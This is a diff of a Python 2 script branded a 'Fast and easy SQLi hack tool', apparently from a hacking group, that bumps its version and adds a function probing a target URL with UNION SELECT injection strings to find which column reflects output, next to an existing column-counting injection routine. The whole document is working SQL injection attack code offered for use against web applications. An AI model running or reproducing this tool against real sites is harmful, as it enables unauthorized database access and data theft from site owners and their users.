@@ -10,7 +10,7 @@ ____ _              ___      _                     _____
                          |___/                                                 
 
 More: https://www.facebook.com/TheCybersTeam
-Fast and easy SQLi hack tool Beta 0.3
+Fast and easy SQLi hack tool Beta 0.4
 """
 print header
 
@@ -26,11 +26,14 @@ def countColumns(url):
     url = url + "-1 union select "
     start = 1
     finish = 50
+
     for i in range(start,finish):
         if i != start and i != finish:
             url = url + ", "
+
         url = url + "'"+key+"'"
         res = getContent(url)
+        
         if res.find(key) !=-1:
             return i
             break
@@ -38,5 +41,29 @@ def countColumns(url):
 
 columns = countColumns(url)
 print "Columns: " + str(columns)
+
+def getVulColumns(columns, url):
+    columns = columns + 1
+    key = "Th3Cyb3rsT34m"
+    inject = "666Th3Cyb3rsTeam666"
+    for i in range(1, columns):
+        linha = "-1 union select "
+        for j in range(1, columns):
+            if j != 1 and j != columns:
+                linha = linha + ", "
+
+            if i == j:
+                linha+="'"+inject+"'"
+            else:
+                linha+="'"+key+"'"
+
+        res = getContent(url + linha)
+        if res.find(inject) !=-1:
+            return i
+            break
+    return 0
+
+vulCol = getVulColumns(columns,url)
+print "Vul Column: " +str(vulCol)
 
 
